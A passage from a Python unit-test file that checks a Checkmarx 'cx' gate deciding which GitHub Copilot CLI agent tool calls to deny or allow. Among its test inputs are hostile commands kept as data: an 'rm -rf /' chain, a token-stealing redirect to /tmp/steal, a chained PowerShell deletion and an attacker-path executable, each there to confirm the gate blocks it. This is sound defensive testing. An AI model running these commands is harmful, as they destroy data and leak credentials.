    These must all pass through the same version/auth/scanner gate as Claude tool names.
    No Bash carve-outs apply (no 'Bash' tool), so even read-only commands via 'command'
    are fully gated. Bootstrap carve-out is also unavailable (no Bash tool in Copilot CLI).
    """

    def setUp(self):
        # All tests in this class simulate the --copilot-cli argv flag so cx_check()
        # sets _COPILOT_CLI_MODE=True even for inputs that don't carry a Copilot CLI envelope.
        self._orig_argv = sys.argv
        sys.argv = ["cx_check.py", "--copilot-cli"]

    def tearDown(self):
        sys.argv = self._orig_argv

    # --- command (shell execution) ---

    def test_command_gates_cx_absent(self):
        decision, code = run(copilot_command("npm test"), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_command_gates_version_below(self):
        decision, code = run(copilot_command("npm test"), version_state="below")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_command_gates_unauthenticated(self):
        decision, code = run(copilot_command("npm test"), authed=False)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_command_passes_when_ok(self):
        decision, code = run(copilot_command("npm test"))
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_command_readonly_carveout_applies(self):
        # command tool shares the readonly allowlist with Bash — read-only commands
        # (ls, cat, grep …) are allowed even when cx is absent, same as Claude's Bash tool.
        decision, code = run(copilot_command("ls -la"), which=None)
        self.assertIsNone(decision)  # silent allow
        self.assertEqual(code, 0)

    # --- bootstrap carve-out works for command tool ---

    def test_command_allows_bootstrap_install(self):
        # Bootstrap carve-out fires for tool_name='command' (Copilot CLI), so
        # the agent can self-install cx even when cx is absent — no manual step needed.
        decision, code = run(copilot_command('bash "%s" install' % BOOTSTRAP), which=None)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_command_allows_bootstrap_upgrade(self):
        decision, code = run(copilot_command('bash "%s" upgrade' % BOOTSTRAP), which=None)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_command_bootstrap_requires_mode(self):
        # Bare bootstrap path with no install/upgrade mode is NOT the carve-out.
        decision, code = run(copilot_command('bash "%s"' % BOOTSTRAP), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_command_bootstrap_rejects_chaining(self):
        decision, code = run(copilot_command('bash "%s"; rm -rf /' % BOOTSTRAP), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    # --- auth recovery works for command tool ---

    def test_command_allows_cx_auth_when_unauthenticated(self):
        # cx auth login via Copilot CLI command tool must be allowed while unauthenticated,
        # so the agent can recover auth without developer running it manually.
        decision, code = run(copilot_command("cx auth login"), authed=False)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_command_allows_cx_configure_when_unauthenticated(self):
        decision, code = run(
            copilot_command("cx configure set --prop-name cx_apikey --prop-value X"),
            authed=False,
        )
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_command_auth_redirect_to_file_still_denied(self):
        # Redirect guard applies to command tool too — token exfiltration blocked.
        decision, code = run(copilot_command("cx auth login > /tmp/steal"), authed=False)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_command_gates_scanner_passthrough(self):
        decision, code = run(copilot_command("npm test"), authed=True,
                             scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    # --- create (file creation) ---

    def test_create_gates_cx_absent(self):
        decision, code = run(copilot_create("/src/foo.py", "print('hi')"), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_create_gates_unauthenticated(self):
        decision, code = run(copilot_create("/src/foo.py"), authed=False)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_create_gates_version_below(self):
        decision, code = run(copilot_create("/src/foo.py"), version_state="below")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_create_passes_when_ok(self):
        decision, code = run(copilot_create("/src/foo.py", "x = 1"))
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_create_gates_scanner_passthrough(self):
        decision, code = run(copilot_create("/src/foo.py"), authed=True,
                             scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    # --- edit (file editing) ---

    def test_edit_gates_cx_absent(self):
        decision, code = run(copilot_edit("/src/bar.py"), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_edit_gates_unauthenticated(self):
        decision, code = run(copilot_edit("/src/bar.py"), authed=False)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_edit_passes_when_ok(self):
        decision, code = run(copilot_edit("/src/bar.py"))
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_edit_gates_scanner_unlicensed(self):
        decision, code = run(copilot_edit("/src/bar.py"), authed=True,
                             scanner_state=cx_check._SCANNER_UNLICENSED)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    # --- REAL Copilot CLI format: toolCalls[0].name + args JSON string ---

    def test_real_format_glob_gates_cx_absent(self):
        # 'glob' is the first tool seen in events.jsonl — gate fires for ALL tool names
        # Real Copilot CLI format → _COPILOT_CLI_MODE=True → flat JSON deny + exit 0
        decision, code = run(copilot_real("glob", {"pattern": "**/*.java"}), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_real_format_powershell_gates_cx_absent(self):
        # 'powershell' is the Windows shell tool — confirmed from events.jsonl
        # Real format → flat JSON deny + exit 0 (not exit 1 — flat JSON is strictly better UX)
        decision, code = run(copilot_real("powershell", {"command": "npm test"}), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_real_format_powershell_passes_when_ok(self):
        decision, code = run(copilot_real("powershell", {"command": "npm test"}))
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_real_format_powershell_bootstrap_allow(self):
        # bootstrap carve-out must fire for powershell tool via the real format
        decision, code = run(copilot_real("powershell", {"command": 'bash "%s" install' % BOOTSTRAP}), which=None)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_real_format_powershell_auth_recovery(self):
        decision, code = run(copilot_real("powershell", {"command": "cx auth login"}), authed=False)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_real_format_create_gates_cx_absent(self):
        # Real format → flat JSON deny + exit 0
        decision, code = run(copilot_real("create", {"file_path": "/src/x.java", "content": "x"}), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_real_format_args_as_json_string_parsed_correctly(self):
        # Verify _tool_input correctly parses args when it's a JSON string
        inp = copilot_real("powershell", {"command": "cx auth login"})
        self.assertEqual(cx_check._tool_name(inp), "powershell")
        self.assertEqual(cx_check._tool_input(inp), {"command": "cx auth login"})

    def test_powershell_auth_recovery_with_call_operator(self):
        """Copilot CLI on Windows: `& "abs-cx-path" auth login 1>$null` must be admitted."""
        orig = cx_check._canonical_cx
        p = r"C:\Users\test\AppData\Local\Checkmarx\cx\cx.exe"
        cx_check._canonical_cx = lambda: p
        try:
            fwd = p.replace("\\", "/")
            inp = {"toolName": "powershell", "toolArgs": json.dumps(
                {"command": '& "{}" auth login --base-auth-uri https://eu.ast.checkmarx.net --tenant cx 1>$null'.format(fwd)})}
            self.assertTrue(cx_check._is_powershell_auth_recovery_command(inp))
            # Ensure it's actually admitted through the full gate
            decision, code = run(inp, authed=False)
            self.assertIsNone(decision)
            self.assertEqual(code, 0)
        finally:
            cx_check._canonical_cx = orig

    def test_powershell_auth_recovery_rejects_chaining(self):
        """Chaining after `& cx auth ...` must be rejected."""
        orig = cx_check._canonical_cx
        p = r"C:\Users\test\AppData\Local\Checkmarx\cx\cx.exe"
        cx_check._canonical_cx = lambda: p
        try:
            fwd = p.replace("\\", "/")
            # Semicolon after auth command → reject
            inp = {"toolName": "powershell", "toolArgs": json.dumps(
                {"command": '& "{}" auth login; Remove-Item -Force evil'.format(fwd)})}
            self.assertFalse(cx_check._is_powershell_auth_recovery_command(inp))
            # Pipe → reject
            inp2 = {"toolName": "powershell", "toolArgs": json.dumps(
                {"command": '& "{}" auth login | Out-Null'.format(fwd)})}
            self.assertFalse(cx_check._is_powershell_auth_recovery_command(inp2))
        finally:
            cx_check._canonical_cx = orig

    def test_powershell_auth_recovery_rejects_wrong_cx_path(self):
        """A different cx path must not be admitted."""
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: r"C:\real\cx.exe"
        try:
            inp = {"toolName": "powershell", "toolArgs": json.dumps(
                {"command": r'& "C:\attacker\cx.exe" auth login 1>$null'})}
            self.assertFalse(cx_check._is_powershell_auth_recovery_command(inp))
        finally:
            cx_check._canonical_cx = orig

    # --- Copilot CLI vs Claude capability probe ---

    def test_capability_probes_include_copilot_cli(self):
        # The capability probe tuple must include the copilot-cli subcommand so a build
        # missing it is correctly classified as 'incapable' rather than let through.
        probes_flat = [" ".join(p) for p in cx_check._CAPABILITY_PROBES]
        self.assertTrue(
            any("copilot-cli-pre-file-write" in p for p in probes_flat),
            "copilot-cli-pre-file-write not in _CAPABILITY_PROBES: %r" % probes_flat,
        )

    # --- camelCase format (Copilot CLI may send toolName/toolInput) ---

    def test_camel_command_gates_cx_absent(self):
        decision, code = run(copilot_command_camel("npm test"), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_camel_command_allows_bootstrap(self):
        # camelCase bootstrap must also be allowed — carve-out handles both formats.
        decision, code = run(copilot_command_camel('bash "%s" install' % BOOTSTRAP), which=None)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_camel_command_allows_auth_recovery(self):
        decision, code = run(copilot_command_camel("cx auth login"), authed=False)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_camel_create_gates_cx_absent(self):
        decision, code = run(copilot_create_camel("/src/foo.py"), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)

    def test_camel_create_passes_when_ok(self):
        decision, code = run(copilot_create_camel("/src/foo.py"))
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_camel_edit_gates_unauthenticated(self):
        decision, code = run(copilot_edit_camel("/src/bar.py"), authed=False)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
